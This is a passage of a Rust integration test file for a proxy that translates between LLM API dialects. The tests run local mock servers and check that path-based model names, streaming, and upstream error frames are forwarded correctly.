            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-from-gemini-path.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-from-gemini-path"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "gemini",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"contents":[{"role":"user","parts":[{"text":"hi"}]}]}"#;
    let req = format!(
        "POST /v1beta/models/gemini-2.5-flash:generateContent HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("200") || resp.contains("hi"),
        "dest Gemini path-model remap must reach upstream, got: {resp}"
    );
}

#[test]
fn proxy_dest_converse_path_model_reaches_upstream() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let n = stream.read(&mut buf).unwrap_or(0);
        let req = String::from_utf8_lossy(&buf[..n]);
        assert!(
            req.contains("\"model\":\"amazon.nova-lite-v1:0\""),
            "dest Converse path model must reach Chat upstream, got: {req}"
        );
        let body = r#"{"id":"1","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":"hi"},"finish_reason":"stop"}]}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-from-converse-path.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-from-converse-path"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "converse",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"messages":[{"role":"user","content":[{"text":"hi"}]}]}"#;
    let req = format!(
        "POST /model/amazon.nova-lite-v1:0/converse HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("200") || resp.contains("hi"),
        "dest Converse path-model remap must reach upstream, got: {resp}"
    );
}

#[test]
fn proxy_dest_gemini_stream_path_sets_upstream_stream() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let n = stream.read(&mut buf).unwrap_or(0);
        let req = String::from_utf8_lossy(&buf[..n]);
        assert!(
            req.contains("\"stream\":true") || req.contains("\"stream\": true"),
            "dest Gemini :streamGenerateContent must set Chat stream, got: {req}"
        );
        let body = concat!(
            "data: {\"id\":\"1\",\"object\":\"chat.completion.chunk\",\"choices\":[{\"index\":0,\"delta\":{\"content\":\"hi\"}}]}\n\n",
            "data: [DONE]\n\n",
        );
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-from-gemini-stream.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-from-gemini-stream"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "gemini",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"contents":[{"role":"user","parts":[{"text":"hi"}]}]}"#;
    let req = format!(
        "POST /v1beta/models/gemini-2.5-flash:streamGenerateContent HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("data:") || resp.contains("hi"),
        "dest Gemini stream path must remap as SSE, got: {resp}"
    );
}

#[test]
fn proxy_dest_gemini_stream_path_model_in_model_version() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let n = stream.read(&mut buf).unwrap_or(0);
        let req = String::from_utf8_lossy(&buf[..n]);
        assert!(
            req.contains("\"model\":\"gemini-2.5-flash\""),
            "dest Gemini stream path model must reach Chat upstream, got: {req}"
        );
        let body = concat!(
            "data: {\"id\":\"1\",\"object\":\"chat.completion.chunk\",\"choices\":[{\"index\":0,\"delta\":{\"content\":\"hi\"}}]}\n\n",
            "data: [DONE]\n\n",
        );
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-from-gemini-stream-model.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-from-gemini-stream-model"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "gemini",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"contents":[{"role":"user","parts":[{"text":"hi"}]}]}"#;
    let req = format!(
        "POST /v1beta/models/gemini-2.5-flash:streamGenerateContent HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("\"modelVersion\":\"gemini-2.5-flash\""),
        "dest Gemini stream must emit path model as modelVersion, got: {resp}"
    );
}

#[test]
fn proxy_dest_gemini_unary_path_model_in_model_version() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let n = stream.read(&mut buf).unwrap_or(0);
        let req = String::from_utf8_lossy(&buf[..n]);
        assert!(
            req.contains("\"model\":\"gemini-2.5-flash\""),
            "dest Gemini unary path model must reach Chat upstream, got: {req}"
        );
        let body = r#"{"id":"1","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":"hi"},"finish_reason":"stop"}]}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-from-gemini-unary-model.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-from-gemini-unary-model"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "gemini",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"contents":[{"role":"user","parts":[{"text":"hi"}]}]}"#;
    let req = format!(
        "POST /v1beta/models/gemini-2.5-flash:generateContent HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("\"modelVersion\":\"gemini-2.5-flash\""),
        "dest Gemini unary JSON must emit path model as modelVersion, got: {resp}"
    );
}

#[test]
fn proxy_dest_messages_path_model_reaches_upstream() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let n = stream.read(&mut buf).unwrap_or(0);
        let req = String::from_utf8_lossy(&buf[..n]);
        assert!(
            req.contains("\"model\":\"claude-sonnet-4\""),
            "dest Messages Vertex path model must reach Chat upstream, got: {req}"
        );
        let body = r#"{"id":"1","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":"hi"},"finish_reason":"stop"}]}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-from-messages-path.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-from-messages-path"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "messages",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"max_tokens":16,"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /v1/projects/p/locations/us-east5/publishers/anthropic/models/claude-sonnet-4:rawPredict HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("200") || resp.contains("hi"),
        "dest Messages path-model remap must reach upstream, got: {resp}"
    );
}

#[test]
fn proxy_dest_messages_stream_path_model_in_message_start() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let n = stream.read(&mut buf).unwrap_or(0);
        let req = String::from_utf8_lossy(&buf[..n]);
        assert!(
            req.contains("\"model\":\"claude-sonnet-4\""),
            "dest Messages stream path model must reach Chat upstream, got: {req}"
        );
        let body = concat!(
            "data: {\"id\":\"1\",\"object\":\"chat.completion.chunk\",\"choices\":[{\"index\":0,\"delta\":{\"content\":\"hi\"}}]}\n\n",
            "data: {\"id\":\"1\",\"object\":\"chat.completion.chunk\",\"choices\":[{\"index\":0,\"delta\":{},\"finish_reason\":\"stop\"}]}\n\n",
            "data: [DONE]\n\n",
        );
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-from-messages-stream-model.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-from-messages-stream-model"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "messages",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"max_tokens":16,"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /v1/projects/p/locations/us-east5/publishers/anthropic/models/claude-sonnet-4:streamRawPredict HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("\"model\":\"claude-sonnet-4\""),
        "dest Messages stream message_start must use the path model, got: {resp}"
    );
    assert!(
        !resp.contains("\"model\":\"\""),
        "dest Messages stream must not emit an empty model, got: {resp}"
    );
}

#[test]
fn proxy_dest_messages_unary_path_model_in_body() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let n = stream.read(&mut buf).unwrap_or(0);
        let req = String::from_utf8_lossy(&buf[..n]);
        assert!(
            req.contains("\"model\":\"claude-sonnet-4\""),
            "dest Messages unary path model must reach Chat upstream, got: {req}"
        );
        let body = r#"{"id":"1","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":"hi"},"finish_reason":"stop"}]}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-from-messages-unary-model.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-from-messages-unary-model"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "messages",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"max_tokens":16,"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /v1/projects/p/locations/us-east5/publishers/anthropic/models/claude-sonnet-4:rawPredict HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("\"model\":\"claude-sonnet-4\""),
        "dest Messages unary JSON must use the path model, got: {resp}"
    );
}

#[test]
fn proxy_dest_chat_azure_path_model_reaches_upstream() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let n = stream.read(&mut buf).unwrap_or(0);
        let req = String::from_utf8_lossy(&buf[..n]);
        assert!(
            req.contains("\"model\":\"gpt-4o\""),
            "dest Chat Azure path model must reach Chat upstream, got: {req}"
        );
        assert!(
            !req.contains("\"model\":\"\""),
            "dest Chat Azure must not send an empty model, got: {req}"
        );
        let body = r#"{"id":"1","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":"hi"},"finish_reason":"stop"}]}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-from-azure-path.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-from-azure-path"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /openai/deployments/gpt-4o/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("200") || resp.contains("hi"),
        "dest Chat Azure path-model remap must reach upstream, got: {resp}"
    );
}

#[test]
fn proxy_eventstream_exception_is_sse_data() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = wiremux::stream::encode_eventstream_exception(
            "validationException",
            br#"{"message":"The provided model identifier is invalid."}"#,
        );
        let header = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/vnd.amazon.eventstream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
            body.len()
        );
        let _ = stream.write_all(header.as_bytes());
        let _ = stream.write_all(&body);
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "bedrock-eventstream-exc.toml",
        &format!(
            r#"
schema_version = 1
id = "bedrock-eventstream-exc"
wire = "converse"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/model/{{model}}/converse"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"amazon.nova-lite-v1:0","stream":true,"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /v1/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("data:"),
        "Event Stream exception must be an SSE data frame, got: {resp}"
    );
    assert!(
        resp.contains("validationException") && resp.contains("model identifier"),
        "must surface exception type and message, got: {resp}"
    );
}

#[test]
fn proxy_gemini_error_chunk_is_sse_data() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body =
            "data: {\"error\":{\"code\":400,\"message\":\"INVALID_ARGUMENT: bad fileUri\"}}\n\n";
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "gemini-error-sse.toml",
        &format!(
            r#"
schema_version = 1
id = "gemini-error-sse"
wire = "gemini"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1beta/models/{{model}}:generateContent"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body =
        r#"{"model":"gemini-2.5-flash","stream":true,"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /v1/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("data:"),
        "Gemini decode HardError must be an SSE data frame, got: {resp}"
    );
    assert!(
        resp.contains("INVALID_ARGUMENT")
            || resp.contains("bad fileUri")
            || resp.contains("hard-error at error:"),
        "must surface vendor error text, got: {resp}"
    );
}

#[test]
fn proxy_upstream_stream_error_is_sse_data() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        // Promise a body, write one byte, then drop so bytes_stream yields Err.
        let header = concat!(
            "HTTP/1.1 200 OK\r\n",
            "Content-Type: text/event-stream\r\n",
            "Content-Length: 4096\r\n",
            "Connection: close\r\n",
            "\r\n",
            "d",
        );
        let _ = stream.write_all(header.as_bytes());
        let _ = stream.flush();
        let _ = stream.shutdown(std::net::Shutdown::Write);
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "gemini-stream-err.toml",
        &format!(
            r#"
schema_version = 1
id = "gemini-stream-err"
wire = "gemini"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1beta/models/{{model}}:generateContent"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body =
        r#"{"model":"gemini-2.5-flash","stream":true,"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /v1/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("data:"),
        "upstream stream transport error must be an SSE data frame, got: {resp}"
    );
    assert!(
        resp.contains("upstream stream"),
        "must name the stream transport context, got: {resp}"
    );
}

#[test]
fn proxy_same_dialect_upstream_stream_error_is_sse_data() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        // Promise a body, write one byte, then drop so bytes_stream yields Err.
        let header = concat!(
            "HTTP/1.1 200 OK\r\n",
            "Content-Type: text/event-stream\r\n",
            "Content-Length: 4096\r\n",
            "Connection: close\r\n",
            "\r\n",
            "d",
        );
        let _ = stream.write_all(header.as_bytes());
        let _ = stream.flush();
        let _ = stream.shutdown(std::net::Shutdown::Write);
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "messages-stream-err.toml",
        &format!(
            r#"
schema_version = 1
id = "messages-stream-err"
wire = "messages"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/messages"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "messages",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"claude-haiku","max_tokens":16,"stream":true,"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /v1/messages HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("data:"),
        "same-dialect upstream stream transport error must be an SSE data frame, got: {resp}"
    );
    assert!(
        resp.contains("upstream stream"),
        "must name the stream transport context, got: {resp}"
    );
}

#[test]
fn proxy_vertex_reuses_provider_and_mints_once() {
    use std::sync::Arc;
    use std::sync::atomic::AtomicU64;

    let hits = Arc::new(AtomicU64::new(0));
    let token_hits = Arc::clone(&hits);
